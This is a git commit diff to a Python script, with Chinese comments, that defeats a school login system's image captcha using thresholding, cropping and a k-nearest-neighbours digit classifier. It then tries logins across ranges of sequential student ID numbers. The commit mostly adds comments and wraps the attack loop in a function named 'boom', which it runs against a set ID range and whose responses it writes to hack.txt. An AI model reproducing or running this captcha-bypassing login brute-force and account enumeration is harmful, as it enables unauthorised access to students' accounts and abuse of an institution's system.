0c15e79ff772aead9439cc03afab3e9960d0d122
209914097 <33018936+209914097@users.noreply.github.com>
2018-01-16 14:58:59 +0800

    Update a.py

--- a.py
+++ a.py
@@ -3,7 +3,6 @@ from os import listdir  # sampledata函数用到
 import requests
 import os
 from requests import get, post, Session
-
 """dowloan()函数用到requests"""
 from bs4 import BeautifulSoup
 
@@ -19,19 +18,19 @@ def biting(imgpath, threshold):
     """
     img = Image.open(imgpath)
     img = img.convert("L")  # 转灰度
-    pixdata = img.load()
-    w, h = img.size
+    pixdata = img.load()  #读取图片像素RGB数值
+    w, h = img.size    #获取图片尺寸大小，即长宽像素
     # 遍历所有像素，大于阈值的为黑色
     for y in range(h):
         for x in range(w):
-            if pixdata[x, y] < threshold:
+            if pixdata[x, y] < threshold:   #像素小于阀值，置为0，图片变为黑白图
                 pixdata[x, y] = 0
             else:
                 pixdata[x, y] = 255
     return img
 
 
-def getimgtable(imgpath):
+def getimgtable(imgpath):  #把黑白图片变成0或1的数阵图像
     img = Image.open(imgpath)
     table = []
     pixdata = img.load()
@@ -57,14 +56,14 @@ def creatfile(data, filename):
 
 def scissor(imgpath):
     """实现剪切图片"""
-    center = [16, 29, 43, 59]
+    center = [16, 29, 43, 59]  #验证码图片4个数字的重心
     if (os.path.exists('E:/桌面文件/one/num') != True):
         os.makedirs('E:/桌面文件/one/num')
     imgname = imgpath.split('.')
     img = Image.open(imgpath)
     for x in range(4):
         box = (center[x] - 7, 11, center[x] + 7, 35)
-        region = img.crop(box)
+        region = img.crop(box)  #进行图片剪切，box(a,b,c,d)参数为宽从像素a到b，高从像素c到d
         region.save('num/' + imgname[0] + '-' + str(x) + '.bmp')
 
 
@@ -78,6 +77,10 @@ def download():
 
 """
 #以下是调试开发用到的一些小工具
+import os #批量创建文件夹
+for x in range(9):
+    os.makedirs(str(x))
+
 for j in range(9):#该循环用于批量重命名
     flist=os.listdir(str(j)) #获取文件个数
     for x in range(len(flist)):
@@ -100,20 +103,20 @@ print(M[1][56:70])
 
 
 def martixtoline(filename):
-    """把矩阵转化为一个行向量"""
+    """把数阵转化为一个行向量"""
     line = zeros((1, 336))  # 336是验证码图片剪切成单个数字后，单个数字图片的像素14x24
     f = open(filename)
     for i in range(24):
-        linestr = f.readline()
+        linestr = f.readline() # 一行一行读文件
         for j in range(14):
-            line[0, 14 * i + j] = int(linestr[j])
+            line[0, 14 * i + j] = int(linestr[j])  #把数阵文件中每一行拼接起来，成为一个行向量
     return line
 
 
 def sampledata():  # 该函数用于把样本数据转化成array类型，以便在numpy中运算
     Labels = []
     FileList = listdir('sampledata')  # load the training set
-    m = len(FileList)
+    m = len(FileList)   #获取样本单元的个数
     Mat = zeros((m, 336))  # 336是验证码图片剪切成单个数字后，单个数字图片的像素14x24
     for i in range(m):
         fileNameStr = FileList[i]
@@ -126,17 +129,17 @@ def sampledata():  # 该函数用于把样本数据转化成array类型，以便
 
 def classify0(inX, dataSet, labels, k):  # KNN算法函数
     dataSetSize = dataSet.shape[0]
-    diffMat = tile(inX, (dataSetSize, 1)) - dataSet
-    sqDiffMat = diffMat ** 2
-    sqDistances = sqDiffMat.sum(axis=1)
-    distances = sqDistances ** 0.5
-    sortedDistIndicies = distances.argsort()
+    diffMat = tile(inX, (dataSetSize, 1)) - dataSet  #每个维度作差
+    sqDiffMat = diffMat ** 2   #每个维度平方运算
+    sqDistances = sqDiffMat.sum(axis=1)     #每个维度相加
+    distances = sqDistances ** 0.5   #开方
+    sortedDistIndicies = distances.argsort()   #排序，得到的是原来位置的索引
     classCount = {}
     for i in range(k):
-        voteIlabel = labels[sortedDistIndicies[i]]
-        classCount[voteIlabel] = classCount.get(voteIlabel, 0) + 1
+        voteIlabel = labels[sortedDistIndicies[i]]   #得到排名靠前的K个标签
+        classCount[voteIlabel] = classCount.get(voteIlabel, 0) + 1   #统计排名靠前的K个标签中，那个标签次数出现最多
     sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(1), reverse=True)
-    return sortedClassCount[0][0]
+    return sortedClassCount[0][0]    #返回排名靠前的K个标签中，标签次数出现最多的标签
 
 
 """#下载验证码识别测试
@@ -198,16 +201,16 @@ def login(username):
         f.write(checkcodecontent.content)
     print('验证码已写入到本地！')
     checkcode = ''
-    bit = biting('checkcode.gif', 88)
+    bit = biting('checkcode.gif', 88)  #88是阀值，去除验证码干扰线和随机噪声点
     bit.save('checkcode.bmp')
     scissor('checkcode.bmp')
     for x in range(4):
         t = getimgtable('num/checkcode-' + str(x) + '.bmp')
         creatfile(t, 'num/checkcode-' + str(x) + '.txt')
-    L, M = sampledata()
+    L, M = sampledata()  #返回样本的标签和样本标签对应的数阵
     for x in range(4):
-        test = martixtoline('num/checkcode-' + str(x) + '.txt')
-        checkcode = checkcode + str(classify0(test, M, L, 3))
+        test = martixtoline('num/checkcode-' + str(x) + '.txt')  #把要验证的数字转化为行向量
+        checkcode = checkcode + str(classify0(test, M, L, 3))    #验证码识别
 
     post_data = {
         '__VIEWSTATE': '/wEPDwUENTM4MWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFEmN0bDAwJEltYWdlQnV0dG9uMS0nFEa6hHMvPk9e8UqDdLj9ClgECnCtpmFqIziOXB+0',
@@ -242,27 +245,28 @@ def login(username):
     except IndexError:
         soup = BeautifulSoup(loging_htmldoc.text, "html.parser")
         span = soup.find_all('span')
-        return (span[28].get_text())
+        return (span[28].get_text())  #返回HTML文档中第28个<span>标签的文本内容
 
 
-""""""
-
-for x in range(100):
-    username = 1500700 + x
-    hack = login(str(username))
-    if (hack != '密码错误 登陆失败'):
-        if (hack == '该学生档案已转入存档,不能登录本系统!'):
-            with open('hack.txt', 'a') as f:
-                f.write( '\n'+str(username) + hack + '\n')
-        elif(hack == '验证码识别出错'):
-            while(hack == '验证码识别出错'):
-                hack = login(str(username))
-                print(str(username) +'验证码识别出错,已重试'+ '\n')
-                print('\n'+str(username) + hack + '\n')
+def boom(start,scope):  #start是起始学号如1700000，scope是起始学号往后的范围
+    for x in range(scope):
+        username = start + x
+        hack = login(str(username))
+        if (hack != '密码错误 登陆失败'):
+            if (hack == '该学生档案已转入存档,不能登录本系统!'):
                 with open('hack.txt', 'a') as f:
-                    f.write('\n' + str(username) + '验证码识别出错,已重试' + '\n')
-                    f.write('\n'+str(username) + hack + '\n')
-        else:
-            print(hack)
-            with open('hack.txt', 'a') as f:
-                f.write(hack)
+                    f.write('\n' + str(username) + hack + '\n')
+            elif (hack == '验证码识别出错'):
+                while (hack == '验证码识别出错'):
+                    hack = login(str(username))   #再次登录
+                    print(str(username) + '验证码识别出错,已重试' + '\n')
+                    print('\n' + str(username) + hack + '\n')
+                    with open('hack.txt', 'a') as f:
+                        f.write('\n' + str(username) + '验证码识别出错,已重试' + '\n')
+                        f.write('\n' + str(username) + hack + '\n')
+            else:
+                print(hack)
+                with open('hack.txt', 'a') as f:
+                    f.write(hack)
+
+boom(1600812,25)
